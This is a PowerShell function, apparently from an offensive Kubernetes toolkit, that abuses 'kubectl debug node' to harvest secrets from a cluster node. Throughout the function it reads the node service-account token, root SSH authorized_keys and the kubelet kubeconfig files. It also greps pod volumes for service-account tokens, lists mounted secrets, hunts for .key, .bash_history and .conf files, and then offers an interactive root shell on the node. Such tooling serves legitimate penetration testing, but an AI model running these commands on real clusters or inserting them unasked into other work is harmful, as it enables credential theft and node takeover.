
Function RetrieveInformationFromNodeWithDebug{
    param(
        [Parameter(Mandatory = $false)]
        [string]$token,        
        [Parameter(Mandatory = $false)]
        [Bool]$DoICreateMasterServiceAccount = $false,
        [Parameter(Mandatory = $true)]
        [string]$namespace

    )
    # Check if the user can create ephemeral debug containers in existing pods
    if (
        (Get-CanIExecuteInNamespace -token $token -command "create pods" -namespace $namespace)-and 
        (Get-CanIExecuteInNamespace -token $token -command "get pods --subresource=exec" -namespace $namespace) -and 
        (Get-CanIExecuteInNamespace -token $token -command "get nodes" -allNamespaces $true)
    ) {
        $nodeName= (Perform-KubectlCommand -action "get" -type "nodes" -token $token -extracommand "-o jsonpath='{.items[0].metadata.name}'") -replace "'", ""
        if([string]::IsNullOrEmpty($nodeName)){
            Write-Host "there was no node found"
            break;
        }
    


        Write-Host "Found the node to target $nodeName. Trying to list some information"
        Write-Host "The node Service account token:" -ForegroundColor Green
        Write-Host ""
        CatAndWriteinformationFromDebugNode -nodeName $nodeName -namespace $namespace -fileName 'ServiceAccountTokens' -command 'cat /host/var/run/secrets/kubernetes.io/serviceaccount/token'
        Write-Host "" -ForegroundColor Green
        Write-Host "The ssh authorized keys:" -ForegroundColor Green
        Write-Host ""
        CatAndWriteinformationFromDebugNode -nodeName $nodeName -namespace $namespace -fileName 'rootAuthorized_keys' -command 'cat /host/root/.ssh/authorized_keys'

        Write-Host "Retrieving bootstrap-kubeconfig:" -ForegroundColor Green
        Write-Host ""
        CatAndWriteinformationFromDebugNode -nodeName $nodeName -namespace $namespace -fileName 'bootstrap-kubeconfig' -command 'cat /host/var/lib/kubelet/bootstrap-kubeconfig'
        Write-Host "Retrieving kubeconfig:" -ForegroundColor Green
        Write-Host ""
        CatAndWriteinformationFromDebugNode -nodeName $nodeName -namespace $namespace -fileName 'kubeconfig' -command 'cat /host/var/lib/kubelet/kubeconfig'
        #Write-Host "some found cache information :"
        #kubectl debug node/$nodeName -it --image=ubuntu -n $namespace -- cat /host/.kube/cache/http/* not possible
        Write-Host ""
        Write-Host "Trying to retrieve all Service Accoun tokens" -ForegroundColor Green
        CatAndWriteinformationFromDebugNode -nodeName $nodeName -namespace $namespace -fileName 'FoundSATokensInPods' -command 'grep -ERi eyj /host/var/lib/kubelet/pods --include=token'
        Write-Host "Searching for some custom secrets"
        CatAndWriteinformationFromDebugNode -nodeName $nodeName -namespace $namespace -fileName 'FoundSecretsInPods' -command 'find /host/var/lib/kubelet/pods/  -type f  -path "*/volumes/kubernetes.io~secret/*"'
        Write-Host "Searching for short lived access tokens form service accounts (however they do live for more then a year)"
        Write-Host ""
        CatAndWriteinformationFromDebugNode -nodeName $nodeName -namespace $namespace -fileName 'ShortLivedAccessTokenSA' -command 'find /host/var/lib/kubelet/pods/ -path "*/volumes/kubernetes.io~projected/*/token"'

        if($extensions.Count -gt 0){
            Foreach($extension in $extensions){
                Get-FileExtensionsFromVolumesInNodes -namespace $namespace -nodeName $nodeName -extension $extension -accesstoken $token -method "debugNode"
            }
        }
        else{
            Write-Host "No extensions where given performing regular search:"
            Write-Host "Searching for any key file on different volumes"
            Write-Host ""
            Get-FileExtensionsFromVolumesInNodes -namespace $namespace -nodeName $nodeName -extension ".key" -accesstoken $token -method "debugNode"
            Write-Host "Searching for BashHistory"
            Get-FileExtensionsFromVolumesInNodes -namespace $namespace -nodeName $nodeName -extension ".bash_history" -accesstoken $token -method "debugNode"
            Write-Host "Searching for configuration files with .conf"
            Get-FileExtensionsFromVolumesInNodes -namespace $namespace -nodeName $nodeName -extension ".conf" -accesstoken $token -method "debugNode"
        }
    
        Write-Host "We ware able to retrieve some information do you want shell in the system?"

        if($PSCmdlet.ShouldProcess($nodeName, "Generate shell on ")){    
            kubectl debug node/$nodeName -it -q --image=ubuntu -n $namespace
            break;
        }
        break;
    }
    else{
        Write-Host "You have not the proper rights to debug the node to retrieve sensitive information"
    }
}